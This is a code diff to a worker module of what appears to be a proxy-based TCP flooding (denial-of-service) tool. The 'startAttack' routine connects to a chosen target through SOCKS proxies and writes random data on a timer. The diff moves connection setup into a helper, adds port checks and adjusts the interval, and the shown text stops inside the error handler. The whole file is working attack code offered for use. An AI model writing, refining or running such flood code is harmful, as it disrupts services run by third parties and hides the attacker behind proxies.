@@ -1,7 +1,6 @@
-import net from "net";
-import { SocksProxyAgent } from "socks-proxy-agent";
 import { parentPort, workerData } from "worker_threads";
 
+import { createTcpClient } from "../utils/clientUtils.js";
 import { randomString } from "../utils/randomUtils.js";
 
 const startAttack = () => {
@@ -11,40 +10,31 @@ const startAttack = () => {
   const port = parseInt(targetPort, 10);
   const fixedTarget = target.startsWith("http") ? target : `tcp://${target}`;
 
+  if (isNaN(port)) throw new Error("Invalid port: Should be a number");
+  if (port < 1 || port > 65535)
+    throw new Error("Invalid port: Should be between 1 and 65535");
+
   let totalPackets = 0;
   const startTime = Date.now();
 
   const sendPacket = async (proxy) => {
-    const socket = new net.Socket();
-    let open = false;
-    socket.setTimeout(2000);
+    const socket = createTcpClient(proxy, { host: targetHost, port: port });
 
-    const proxyAgent = new SocksProxyAgent(
-      `${proxy.protocol}://${proxy.username && proxy.password ? `${proxy.username}:${proxy.password}@` : ""}${proxy.host}:${proxy.port}`
-    );
-
-    setInterval(() => {
-      if (socket.writable && open) {
-        socket.write(randomString(packetSize));
-      }
-    }, [1000]);
-
-    socket.connect({ host: targetHost, port: port, agent: proxyAgent }, () => {
+    socket.on("connect", () => {
       totalPackets++;
-      open = true;
+
       parentPort.postMessage({
         log: `✅ Packet sent from ${proxy.protocol}://${proxy.host}:${proxy.port} to ${fixedTarget}`,
         totalPackets,
       });
-    });
 
-    socket.on("close", () => {
-      open = false;
-    });
-
-    socket.on("timeout", () => {
-      socket.destroy();
-      open = false;
+      const interval = setInterval(() => {
+        if (socket.writable && socket["open"]) {
+          socket.write(randomString(packetSize));
+        } else {
+          clearInterval(interval);
+        }
+      }, 3000);
     });
 
     socket.on("error", (err) => {
